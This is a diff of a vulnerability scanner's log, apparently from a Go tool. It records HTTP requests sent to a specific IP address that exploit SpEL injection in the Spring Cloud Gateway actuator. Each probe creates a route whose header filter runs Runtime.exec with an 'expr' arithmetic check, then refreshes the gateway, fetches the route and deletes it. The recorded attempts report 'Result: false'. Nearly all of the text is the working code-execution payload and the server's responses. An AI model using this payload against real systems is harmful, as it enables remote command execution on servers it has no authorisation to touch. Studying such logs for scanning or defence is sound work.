@@ -1,218 +1,218 @@
-2022-03-05 11:25:46	info	core/checker.go:135	----------------------------------------------------------------
-2022-03-05 11:25:46	info	core/checker.go:137	Request:
+2022-03-05 16:10:06	info	core/checker.go:168	----------------------------------------------------------------
+2022-03-05 16:10:06	info	core/checker.go:170	Request:
 
-2022-03-05 11:25:46	info	core/checker.go:138	http://121.196.164.206:9000/actuator/gateway/routes/randomLowercase%288%29
+2022-03-05 16:10:06	info	core/checker.go:171	http://121.196.164.206:9000/actuator/gateway/routes/trhaupsv
 post http: //121.196.164.206:9000 HTTP/1.1
 user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
 content-type: application/json
 
 
 {
-  "id": "randomLowercase(8)",
+  "id": "trhaupsv",
   "filters": [{
     "name": "AddResponseHeader",
-    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"expr\",\"randomInt(800000000, 1000000000)\",\"+\",\"randomInt(800000000, 1000000000)\"}).getInputStream()))}"}
+    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"expr\",\"898498081\",\"+\",\"827131847\"}).getInputStream()))}"}
   }],
 "uri": "http://example.com",
 "order": 0
 }
-2022-03-05 11:25:46	info	core/checker.go:139	Response:
+2022-03-05 16:10:06	info	core/checker.go:172	Response:
 
-2022-03-05 11:25:46	info	core/checker.go:140	HTTP/1.1 201 Created
-Date: Sat, 05 Mar 2022 03:25:46 GMT
+2022-03-05 16:10:06	info	core/checker.go:173	HTTP/1.1 201 Created
+Date: Sat, 05 Mar 2022 08:10:06 GMT
 Content-Length: 0
 Vary: Origin
 Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
-Location: /routes/randomLowercase(8)
+Location: /routes/trhaupsv
 
 
-2022-03-05 11:25:46	info	core/checker.go:137	Request:
+2022-03-05 16:10:06	info	core/checker.go:170	Request:
 
-2022-03-05 11:25:46	info	core/checker.go:138	http://121.196.164.206:9000/actuator/gateway/refresh
+2022-03-05 16:10:06	info	core/checker.go:171	http://121.196.164.206:9000/actuator/gateway/refresh
 post http: //121.196.164.206:9000 HTTP/1.1
 user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
-content-type: application/x-www-form-urlencoded
+content-type: application/json
 
 
 
-2022-03-05 11:25:46	info	core/checker.go:139	Response:
+2022-03-05 16:10:06	info	core/checker.go:172	Response:
 
-2022-03-05 11:25:46	info	core/checker.go:140	HTTP/1.1 200 OK
-Date: Sat, 05 Mar 2022 03:25:46 GMT
+2022-03-05 16:10:06	info	core/checker.go:173	HTTP/1.1 200 OK
+Date: Sat, 05 Mar 2022 08:10:06 GMT
 Content-Length: 0
 Vary: Origin
 Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 
 
-2022-03-05 11:25:46	info	core/checker.go:137	Request:
+2022-03-05 16:10:06	info	core/checker.go:170	Request:
 
-2022-03-05 11:25:46	info	core/checker.go:138	http://121.196.164.206:9000/actuator/gateway/routes/randomLowercase%288%29
-user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
-content-type: application/x-www-form-urlencoded
+2022-03-05 16:10:06	info	core/checker.go:171	http://121.196.164.206:9000/actuator/gateway/routes/trhaupsv
 get http: //121.196.164.206:9000 HTTP/1.1
+user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+content-type: application/json
 
 
 
-2022-03-05 11:25:46	info	core/checker.go:139	Response:
+2022-03-05 16:10:06	info	core/checker.go:172	Response:
 
-2022-03-05 11:25:46	info	core/checker.go:140	HTTP/1.1 404 Not Found
-Date: Sat, 05 Mar 2022 03:25:46 GMT
+2022-03-05 16:10:06	info	core/checker.go:173	HTTP/1.1 404 Not Found
+Date: Sat, 05 Mar 2022 08:10:06 GMT
 Content-Length: 0
 Vary: Origin
 Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 
 
-2022-03-05 11:25:46	info	core/checker.go:137	Request:
+2022-03-05 16:10:06	info	core/checker.go:170	Request:
 
-2022-03-05 11:25:46	info	core/checker.go:138	http://121.196.164.206:9000/actuator/gateway/routes/randomLowercase%288%29
+2022-03-05 16:10:06	info	core/checker.go:171	http://121.196.164.206:9000/actuator/gateway/routes/trhaupsv
 delete http: //121.196.164.206:9000 HTTP/1.1
 user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
 content-type: application/octet-stream
 
 
 
-2022-03-05 11:25:46	info	core/checker.go:139	Response:
+2022-03-05 16:10:06	info	core/checker.go:172	Response:
 
-2022-03-05 11:25:46	info	core/checker.go:140	HTTP/1.1 200 OK
-Date: Sat, 05 Mar 2022 03:25:46 GMT
+2022-03-05 16:10:06	info	core/checker.go:173	HTTP/1.1 200 OK
+Date: Sat, 05 Mar 2022 08:10:06 GMT
 Content-Length: 0
 Vary: Origin
 Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 
 
-2022-03-05 11:25:46	info	core/checker.go:137	Request:
+2022-03-05 16:10:06	info	core/checker.go:170	Request:
 
-2022-03-05 11:25:46	info	core/checker.go:138	http://121.196.164.206:9000/actuator/gateway/refresh
+2022-03-05 16:10:06	info	core/checker.go:171	http://121.196.164.206:9000/actuator/gateway/refresh
 user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
-content-type: application/x-www-form-urlencoded
+content-type: application/json
 post http: //121.196.164.206:9000 HTTP/1.1
 
 
 
-2022-03-05 11:25:46	info	core/checker.go:139	Response:
+2022-03-05 16:10:06	info	core/checker.go:172	Response:
 
-2022-03-05 11:25:46	info	core/checker.go:140	HTTP/1.1 200 OK
-Date: Sat, 05 Mar 2022 03:25:46 GMT
+2022-03-05 16:10:06	info	core/checker.go:173	HTTP/1.1 200 OK
+Date: Sat, 05 Mar 2022 08:10:06 GMT
 Content-Length: 0
 Vary: Origin
 Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 
 
-2022-03-05 11:25:46	info	core/checker.go:143	Result: false
+2022-03-05 16:10:06	info	core/checker.go:176	Result: false
 
-2022-03-05 11:25:46	info	core/checker.go:144	
-2022-03-05 11:25:46	info	core/checker.go:145	^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-2022-03-05 11:36:34	info	core/checker.go:135	----------------------------------------------------------------
-2022-03-05 11:36:35	info	core/checker.go:137	Request:
+2022-03-05 16:10:06	info	core/checker.go:177	
+2022-03-05 16:10:06	info	core/checker.go:178	^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+2022-03-05 16:51:07	info	core/checker.go:166	----------------------------------------------------------------
+2022-03-05 16:51:07	info	core/checker.go:168	Request:
 
-2022-03-05 11:36:35	info	core/checker.go:138	http://121.196.164.206:9000/actuator/gateway/routes/randomLowercase%288%29
+2022-03-05 16:51:07	info	core/checker.go:169	http://121.196.164.206:9000/actuator/gateway/routes/akgsokdl
+user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+content-type: application/json
+post http: //121.196.164.206:9000 HTTP/1.1
+
+
+{
+  "id": "akgsokdl",
+  "filters": [{
+    "name": "AddResponseHeader",
+    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"expr\",\"898498081\",\"+\",\"827131847\"}).getInputStream()))}"}
+  }],
+"uri": "http://example.com",
+"order": 0
+}
+2022-03-05 16:51:07	info	core/checker.go:170	Response:
+
+2022-03-05 16:51:07	info	core/checker.go:171	HTTP/1.1 201 Created
+Date: Sat, 05 Mar 2022 08:51:07 GMT
+Content-Length: 0
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Location: /routes/akgsokdl
+
+
+2022-03-05 16:51:07	info	core/checker.go:168	Request:
+
+2022-03-05 16:51:07	info	core/checker.go:169	http://121.196.164.206:9000/actuator/gateway/refresh
 content-type: application/json
 post http: //121.196.164.206:9000 HTTP/1.1
 user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
 
 
-{
-  "id": "randomLowercase(8)",
-  "filters": [{
-    "name": "AddResponseHeader",
-    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"expr\",\"randomInt(800000000, 1000000000)\",\"+\",\"randomInt(800000000, 1000000000)\"}).getInputStream()))}"}
-  }],
-"uri": "http://example.com",
-"order": 0
-}
-2022-03-05 11:36:35	info	core/checker.go:139	Response:
 
-2022-03-05 11:36:35	info	core/checker.go:140	HTTP/1.1 201 Created
-Date: Sat, 05 Mar 2022 03:36:33 GMT
-Content-Length: 0
-Vary: Origin
-Vary: Access-Control-Request-Method
-Vary: Access-Control-Request-Headers
-Location: /routes/randomLowercase(8)
+2022-03-05 16:51:07	info	core/checker.go:170	Response:
 
-
-2022-03-05 11:36:35	info	core/checker.go:137	Request:
-
-2022-03-05 11:36:35	info	core/checker.go:138	http://121.196.164.206:9000/actuator/gateway/refresh
-post http: //121.196.164.206:9000 HTTP/1.1
-user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
-content-type: application/x-www-form-urlencoded
-
-
-
-2022-03-05 11:36:35	info	core/checker.go:139	Response:
-
-2022-03-05 11:36:35	info	core/checker.go:140	HTTP/1.1 200 OK
-Date: Sat, 05 Mar 2022 03:36:33 GMT
+2022-03-05 16:51:07	info	core/checker.go:171	HTTP/1.1 200 OK
+Date: Sat, 05 Mar 2022 08:51:07 GMT
 Content-Length: 0
 Vary: Origin
 Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 
 
-2022-03-05 11:36:35	info	core/checker.go:137	Request:
+2022-03-05 16:51:07	info	core/checker.go:168	Request:
 
-2022-03-05 11:36:35	info	core/checker.go:138	http://121.196.164.206:9000/actuator/gateway/routes/randomLowercase%288%29
+2022-03-05 16:51:07	info	core/checker.go:169	http://121.196.164.206:9000/actuator/gateway/routes/akgsokdl
+content-type: application/json
 get http: //121.196.164.206:9000 HTTP/1.1
 user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
-content-type: application/x-www-form-urlencoded
 
 
 
-2022-03-05 11:36:35	info	core/checker.go:139	Response:
+2022-03-05 16:51:07	info	core/checker.go:170	Response:
 
-2022-03-05 11:36:35	info	core/checker.go:140	HTTP/1.1 404 Not Found
-Date: Sat, 05 Mar 2022 03:36:33 GMT
+2022-03-05 16:51:07	info	core/checker.go:171	HTTP/1.1 404 Not Found
+Date: Sat, 05 Mar 2022 08:51:07 GMT
 Content-Length: 0
 Vary: Origin
 Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 
 
-2022-03-05 11:36:35	info	core/checker.go:137	Request:
+2022-03-05 16:51:07	info	core/checker.go:168	Request:
 
-2022-03-05 11:36:35	info	core/checker.go:138	http://121.196.164.206:9000/actuator/gateway/routes/randomLowercase%288%29
+2022-03-05 16:51:07	info	core/checker.go:169	http://121.196.164.206:9000/actuator/gateway/routes/akgsokdl
 delete http: //121.196.164.206:9000 HTTP/1.1
 user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
 content-type: application/octet-stream
 
 
 
-2022-03-05 11:36:35	info	core/checker.go:139	Response:
+2022-03-05 16:51:07	info	core/checker.go:170	Response:
 
-2022-03-05 11:36:35	info	core/checker.go:140	HTTP/1.1 200 OK
-Date: Sat, 05 Mar 2022 03:36:34 GMT
+2022-03-05 16:51:07	info	core/checker.go:171	HTTP/1.1 200 OK
+Date: Sat, 05 Mar 2022 08:51:07 GMT
 Content-Length: 0
 Vary: Origin
 Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 
 
-2022-03-05 11:36:35	info	core/checker.go:137	Request:
+2022-03-05 16:51:07	info	core/checker.go:168	Request:
 
-2022-03-05 11:36:35	info	core/checker.go:138	http://121.196.164.206:9000/actuator/gateway/refresh
+2022-03-05 16:51:07	info	core/checker.go:169	http://121.196.164.206:9000/actuator/gateway/refresh
 post http: //121.196.164.206:9000 HTTP/1.1
 user-agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
-content-type: application/x-www-form-urlencoded
+content-type: application/json
 
 
 
-2022-03-05 11:36:35	info	core/checker.go:139	Response:
+2022-03-05 16:51:07	info	core/checker.go:170	Response:
 
-2022-03-05 11:36:35	info	core/checker.go:140	HTTP/1.1 200 OK
-Date: Sat, 05 Mar 2022 03:36:34 GMT
+2022-03-05 16:51:07	info	core/checker.go:171	HTTP/1.1 200 OK
+Date: Sat, 05 Mar 2022 08:51:07 GMT
 Content-Length: 0
 Vary: Origin
 Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 
 
-2022-03-05 11:36:35	info	core/checker.go:143	Result: false
+2022-03-05 16:51:07	info	core/checker.go:174	Result: false
 
-2022-03-05 11:36:35	info	core/checker.go:144	
-2022-03-05 11:36:35	info	core/checker.go:145	^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+2022-03-05 16:51:07	info	core/checker.go:175	
+2022-03-05 16:51:07	info	core/checker.go:176	^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
